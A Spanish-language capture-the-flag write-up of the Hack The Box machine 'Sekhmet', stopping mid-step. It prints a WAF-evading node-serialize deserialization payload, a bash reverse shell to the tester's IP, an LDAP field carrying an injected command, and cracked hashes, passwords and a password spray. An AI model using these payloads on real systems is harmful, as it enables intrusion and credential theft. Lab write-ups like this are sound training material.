---
layout: post
title: Sekhmet
date: 2023-04-02
description:
img:
fig-caption:
tags: [OSCP, eCPPTXv2]
---
___

<center><img src="/writeups/assets/img/Sekhmet-htb/Sekhmet.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.179 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 21:54 GMT
Nmap scan report for 10.10.11.179
Host is up (0.10s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 27.09 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.179 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 21:55 GMT
Nmap scan report for 10.10.11.179
Host is up (0.094s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 8c7155df97275ed5375a8de2923bf36e (RSA)
|   256 b232f5889bfb58fa35b0710c9abd3cef (ECDSA)
|_  256 eb73c0936e40c8f6b0a828937d18474c (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.66 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.179
http://10.10.11.179 [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.179], Title[403 Forbidden], nginx[1.18.0]
```

Agrego el dominio ```windcorp.htb``` y el subdominio ```www.windcorp.htb``` al ```/etc/hosts```

La página principal se ve así:

<img src="/writeups/assets/img/Sekhmet-htb/1.png" alt="">

Encuentro un subdominio con ```wfuzz```

```null
wfuzz -c --hh=153 -t 200 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.windcorp.htb" http://windcorp.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://windcorp.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000048:   403        43 L     162 W      2436 Ch     "portal"                                                                                                                                        

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

Lo añado al ```/etc/hosts```. Corresponde a un panel de inicio de sesión

<img src="/writeups/assets/img/Sekhmet-htb/2.png" alt="">

Las credenciales de acceso son ```admin:admin```

Está utilizando el Framework ```Express``` y ```Node.js```

<img src="/writeups/assets/img/Sekhmet-htb/3.png" alt="">

Es vulnerable a un ataque de deserialización. Está detallado todo en [Hacktricks](https://book.hacktricks.xyz/pentesting-web/deserialization#node-serialize)

Modifico la cookie de sesión ```profile``` por un payload en base64 y urlencodeado

```null
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ping 10.10.16.2', function(error, stdout, stderr) { console.log(stdout) })}"}
```

Pero me salta el WAF

<img src="/writeups/assets/img/Sekhmet-htb/4.png" alt="">

Para solucionarlo, basta con obfuscar el payload introduciendo en unicode cadenas en formato ASCII

```null
{"rce":"_$$ND_FUNC\u0024$_function() \u007brequire('child_process').exec('ping -c 1 10.10.16.2', function(error,stdout,stderr) {console.log(stdout) });\n}()"}
```

Recibo la traza ICMP

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:03:36.323767 IP 10.10.11.179 > 10.10.16.2: ICMP echo request, id 1000, seq 1, length 64
13:03:36.323961 IP 10.10.16.2 > 10.10.11.179: ICMP echo reply, id 1000, seq 1, length 64
```

Me envío una reverse shell

```null
{"rce":"_$$ND_FUNC\u0024$_function() \u007brequire('child_process').exec(\"bash -c 'bash -i >& /dev/tcp/10.10.16.2/443 0>&1'\", function(error,stdout,stderr) {console.log(stdout) });\n}()"}
```

Gano acceso a un contenedor

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.179.
Ncat: Connection from 10.10.11.179:56890.
bash: cannot set terminal process group (475): Inappropriate ioctl for device
bash: no job control in this shell
webster@webserver:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
webster@webserver:/$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
webster@webserver:/$ export TERM=xterm
webster@webserver:/$ export SHELL=bash
webster@webserver:/$ stty rows 55 columns 209
```

En su directorio personal hay un ```backup.zip```

```null
webster@webserver:~$ ls
backup.zip
```

Me lo transfiero a mi equipo. Está protegido por contraseña.

```null
unzip backup.zip -d backup
Archive:  backup.zip
[backup.zip] etc/passwd password: 
```

Utilizo el ```pspy``` para ver las tareas que se ejecutan a intervalos regulares de tiempo

```null
2023/04/03 15:15:34 CMD: UID=0    PID=384    | /usr/sbin/cron -f 
2023/04/03 15:15:34 CMD: UID=0    PID=380    | /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files 
2023/04/03 15:15:34 CMD: UID=0    PID=379    | /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files 
2023/04/03 15:15:34 CMD: UID=0    PID=378    | /usr/libexec/sssd/sssd_be --domain windcorp.htb --uid 0 --gid 0 --logger=files 
```

El usuario ```root``` está corriendo un proceso que se encarga de conectar el contenedor al Directorio Activo. Tengo un backup con todos los archivos de configuración

```null
webster@webserver:/var/lib/sss$ ls
db  deskprofile  gpo_cache  keytabs  mc  pipes  pubconf  secrets
```

Listo el archivo de configuración de Kerberos

```null
webster@webserver:~$ cat /etc/krb5.conf 
[libdefaults]
	default_realm = WINDCORP.HTB

# The following krb5.conf variables are only for MIT Kerberos.
	kdc_timesync = 1
	ccache_type = 4
	forwardable = true
	proxiable = true

# The following encryption type specification will be used by MIT Kerberos
# if uncommented.  In general, the defaults in the MIT Kerberos code are
# correct and overriding these specifications only serves to disable new
# encryption types as they are added, creating interoperability problems.
#
# The only time when you might need to uncomment these lines and change
# the enctypes is if you have local software that will break on ticket
# caches containing ticket encryption types it doesn't know about (such as
# old versions of Sun Java).

#	default_tgs_enctypes = des3-hmac-sha1
#	default_tkt_enctypes = des3-hmac-sha1
#	permitted_enctypes = des3-hmac-sha1

# The following libdefaults parameters are only for Heimdal Kerberos.
	fcc-mit-ticketflags = true

[realms]
	WINDCORP.HTB = {
		kdc = hope.windcorp.htb
		admin_server = hope.windcorp.com
		default_domain = windcorp.htb
	}

[domain_realm]
	.windcorp.htb = WINDCORP.HTB
	windcorp.com = WINDCORP.HTB

[appdefaults]
	forwardable = true
		pam = {
			WINDCORP.HTB = {
				ignore_k5login = false
				}
		}
```

Obtengo un nuevo subdominio, ```hope.windcorp.htb```. Resuelvo a su IP

```null
webster@webserver:~$ nslookup hope.windcorp.htb
Server:		192.168.0.2
Address:	192.168.0.2#53

Name:	hope.windcorp.htb
Address: 192.168.0.2
Name:	hope.windcorp.htb
Address: 10.10.11.179
```

Subo un binario estático de ```nmap``` para aplicar HostDiscovery

```null
webster@webserver:/tmp$ ./nmap --min-rate 5000 -n -sn 192.168.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-04-03 15:23 CEST
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.0.2
Host is up (0.0014s latency).
Nmap scan report for 192.168.0.100
Host is up (0.00024s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 0.30 seconds
```

Únicamente están disponible las dos que ya conocía

Obtengo el método de cifrado del ZIP

```null
7z l -slt backup.zip | grep Method | sort -u
Method = Store
Method = ZipCrypto Deflate
Method = ZipCrypto Store
```

Para hacer el proceso inverso se puede utilizar la herramienta ```pkcrack```. Disponible en [Github](https://github.com/keyunluo/pkcrack). Es necesario crear un nuevo comprimido con el ```/etc/passwd``` del contenedor, para que lo tome como semilla

```null
zip plain.zip /etc/passwd
/opt/pkcrack/bin/extract plain.zip passwd passwd.plain
```

Extraigo el ```passwd``` encriptado del comprimido

```null
/opt/pkcrack/bin/extract backup.zip etc/passwd passwd.enc
```

Encuentro las keys

```null
pkcrack -c passwd.enc -p passwd.plain
Files read. Starting stage 1 on Mon Apr  3 14:04:52 2023
Generating 1st generation of possible key2_553 values...done.
Found 4194304 possible key2-values.
Now we're trying to reduce these...
Done. Left with 13702 possible Values. bestOffset is 24.
Stage 1 completed. Starting stage 2 on Mon Apr  3 14:05:13 2023
Ta-daaaaa! key0=d6829d8d, key1=8514ff97, key2=afc3f825
```

Le hago el decrypt

```null
/opt/pkcrack/bin/zipdecrypt d6829d8d 8514ff97 afc3f825 backup.zip decrypted.zip
```

Lo descomprimo

```null
unzip decrypted.zip -d backup
```

En ```var/lib/sss/db/cache_windcorp.htb.ldb``` hay credenciales cacheadas para un usuario, ```Ray.Duncan@WINDCORP.HTB:$6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035.Nj.CIDbe/u98V3mLrMhDHiAsh89BX9ByXoGzcXnPXQQF/hAj5ajIsm0zB.wg2zX81```

La crackeo con ```john```

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pantera          (Ray.Duncan@WINDCORP.HTB)     
1g 0:00:00:00 DONE (2023-04-03 14:35) 4.000g/s 6144p/s 6144c/s 6144C/s 123456..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Genero un TGT para este usuario

```null
webster@webserver:~$ kinit ray.duncan
Password for ray.duncan@WINDCORP.HTB: 
```

Me convierto en ```root```

```null
Authenticated ray.duncan@WINDCORP.HTB
Account root: authorization for ray.duncan@WINDCORP.HTB successful
Changing uid to root (0)
root@webserver:/home/webster# 
```

Puedo ver la primera flag

```null
root@webserver:~# cat user.txt 
af0881317ddefd0af409b5cd4cd149d6
```

Para poder conectarme posteriormente por SSH, añado mi clave pública a las ```authorized_keys```. Aplico un Dinamic Port Forwarding para tener conectividad con la ```192.168.0.2```

```null
ssh root@10.10.11.179 -D 1080
Linux webserver 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Apr  3 16:44:42 2023 from hope.windcorp.htb
root@webserver:~#
```

# Escalada

Escaneo los puertos del DC a través del contenedor

```null
root@webserver:/tmp# ./nmap -p- --open --min-rate 5000 -n -Pn -sS 192.168.0.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-04-03 16:48 CEST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.0.2
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00057s latency).
Not shown: 65519 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd
636/tcp   open  ldaps
3268/tcp  open  unknown
3269/tcp  open  unknown
5985/tcp  open  unknown
9389/tcp  open  unknown
49664/tcp open  unknown
56775/tcp open  unknown
60395/tcp open  unknown
62054/tcp open  unknown
MAC Address: 00:15:5D:10:93:01 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 39.73 seconds
```

Obtengo en mi equipo el TGT para poder enumerar el SMB o incluso conectarme por WINRM

```null
proxychains impacket-getST -dc-ip 192.168.0.2 -spn cifs/hope.windcorp.htb 'windcorp/ray.duncan:pantera'
export KRB5CCNAME=ray.duncan.ccache
```

Listo los recursos compartidos

```null
proxychains impacket-smbclient -k -no-pass hope.windcorp.htb
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
WC-Share
# use WC-Share
# ls
drw-rw-rw-          0  Mon May  2 10:33:07 2022 .
drw-rw-rw-          0  Mon Apr  3 12:57:58 2023 ..
drw-rw-rw-          0  Mon Apr  3 15:02:25 2023 temp
# cd temp
# ls
drw-rw-rw-          0  Mon Apr  3 15:02:25 2023 .
drw-rw-rw-          0  Mon May  2 10:33:07 2022 ..
-rw-rw-rw-         88  Mon Apr  3 15:02:25 2023 debug-users.txt
# get debug-users.txt
```

Obtengo varios usuarios

```null
cat debug-users.txt
IvanJennings43235345
MiriamMills93827637
BenjaminHernandez23232323
RayDuncan9342211
```

Descargo todo lo que hay en ```NETLOGON```

```null
# use NETLOGON
# dir
# ls
drw-rw-rw-          0  Mon May  2 07:49:18 2022 .
drw-rw-rw-          0  Mon Apr 25 20:59:55 2022 ..
-rw-rw-rw-       2124  Mon May  2 06:47:14 2022 form.ps1
-rw-rw-rw-       2710  Mon May  2 07:49:18 2022 Update phone.lnk
-rw-rw-rw-      47774  Sun May  1 21:45:21 2022 windcorp-logo.png
# get form.ps1
# get Update phone.lnk
# get windcorp-logo.png
```

Veo el contenido del ```form.ps1```

```null
cat form.ps1
#Create Objects
$SysInfo = New-Object -ComObject "ADSystemInfo"
$UserDN = $SysInfo.GetType().InvokeMember("UserName","GetProperty", $Null, $SysInfo, $Null)
$User = [adsi]"LDAP://$($UserDN)"


#Create form
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = 'SMS password reset setup'
$form.Size = New-Object System.Drawing.Size(300,200)
$form.StartPosition = 'CenterScreen'

$okButton = New-Object System.Windows.Forms.Button
$okButton.Location = New-Object System.Drawing.Point(75,120)
$okButton.Size = New-Object System.Drawing.Size(75,23)
$okButton.Text = 'OK'
$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.AcceptButton = $okButton
$form.Controls.Add($okButton)

$cancelButton = New-Object System.Windows.Forms.Button
$cancelButton.Location = New-Object System.Drawing.Point(150,120)
$cancelButton.Size = New-Object System.Drawing.Size(75,23)
$cancelButton.Text = 'Cancel'
$cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
$form.CancelButton = $cancelButton
$form.Controls.Add($cancelButton)

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(10,20)
$label.Size = New-Object System.Drawing.Size(280,20)
$label.Text = 'To be able to reset password using SMS,'
$form.Controls.Add($label)

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(10,40)
$label.Size = New-Object System.Drawing.Size(280,20)
$label.Text = ' you need to keep it updated:'
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(10,60)
$textBox.Size = New-Object System.Drawing.Size(260,20)
$form.Controls.Add($textBox)
$textBox.Text = $User.Get("mobile")

$form.Topmost = $true

$form.Add_Shown({$textBox.Select()})
$result = $form.ShowDialog()

if ($result -eq [System.Windows.Forms.DialogResult]::OK)
{
    $x = $textBox.Text
    $User.Put("mobile",$x)
    $User.SetInfo()
}
```

El script consiste en una autenticación al LDAP como un usuario. Como tengo un TGT, puedo tratar de modificar el atributo ```mobile``` de este usuario y ejecutar comandos. Listo este campo con ```ldapsearch```.

```null
root@webserver:~# ldapsearch -H ldap://windcorp.htb -b "DC=windcorp,DC=htb" | grep mobile
SASL/GSS-SPNEGO authentication started
SASL username: ray.duncan@WINDCORP.HTB
SASL SSF: 256
SASL data security layer installed.
mobile: 43235345
mobile: 93827637
mobile: 23232323
mobile: 9342211
```

Creo un archivo de configuración ```test.ldif```

```null
root@webserver:~# cat test.ldif 
dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
changetype: modify
replace: mobile
mobile: 1; ping 10.10.16.2
```

Lo modifico y recibo las trazas ICMP

```null
root@webserver:~# ldapmodify -Y GSSAPI -H ldap://windcorp.htb -D "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb" -f test.ldif
SASL/GSSAPI authentication started
SASL username: ray.duncan@WINDCORP.HTB
SASL SSF: 256
SASL data security layer installed.
modifying entry "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb"
```

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:41:07.644236 IP 10.10.11.179 > 10.10.16.2: ICMP echo request, id 1, seq 1, length 40
15:41:07.644377 IP 10.10.16.2 > 10.10.11.179: ICMP echo reply, id 1, seq 1, length 40
15:41:08.654335 IP 10.10.11.179 > 10.10.16.2: ICMP echo request, id 1, seq 2, length 40
15:41:08.654381 IP 10.10.16.2 > 10.10.11.179: ICMP echo reply, id 1, seq 2, length 40
15:41:09.669505 IP 10.10.11.179 > 10.10.16.2: ICMP echo request, id 1, seq 3, length 40
15:41:09.669528 IP 10.10.16.2 > 10.10.11.179: ICMP echo reply, id 1, seq 3, length 40
15:41:10.687678 IP 10.10.11.179 > 10.10.16.2: ICMP echo request, id 1, seq 4, length 40
15:41:10.687714 IP 10.10.16.2 > 10.10.11.179: ICMP echo reply, id 1, seq 4, length 40
```

La intrusión no es tan sencilla ya que hay que bypassear el AMSI. Aplico un Remote Port Forwaring para traerme el puerto 445 del DC

Agrego siguiente configuración al ```/etc/ssh/sshd_config```

```null
GatewayPorts yes
```

```null
ssh root@10.10.11.179 -D 1080 -R 0.0.0.0:445:127.0.0.1:445
```

Obtengo un hash NetNTLMv2. Lo crackeo con ```john```

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@p%i&J#iNNo1T2  (scriptrunner)     
1g 0:00:00:03 DONE (2023-04-03 16:21) 0.3311g/s 4749Kp/s 4749Kc/s 4749KC/s !Sketchy!..*7¡Vamos!
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Me dumpeo todos los usuarios del dominio

```null
root@webserver:/tmp# ldapsearch -H ldap://hope.windcorp.htb -b "DC=WINDCORP,DC=HTB" sAMAccountName "CN=Users,DC=windcorp,DC=HTB" | grep sAMAccountName | awk '{print $2}' > users
```

Con ```kerbrute``` hago un Password Spraying

```null
root@webserver:/tmp# ./kerbrute passwordspray -d windcorp.htb users '!@p%i&J#iNNo1T2'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/03/23 - Ronnie Flathers @ropnop

2023/04/03 18:37:58 >  Using KDC(s):
2023/04/03 18:37:58 >  	hope.windcorp.htb:88

2023/04/03 18:37:59 >  [+] VALID LOGIN:	Bob.Wood@windcorp.htb:!@p%i&J#iNNo1T2
2023/04/03 18:38:04 >  [+] VALID LOGIN:	scriptrunner@windcorp.htb:!@p%i&J#iNNo1T2
2023/04/03 18:38:04 >  Done! Tested 597 logins (2 successes) in 6.344 seconds
```

Solicito un TGT para ```Bob.Wood```

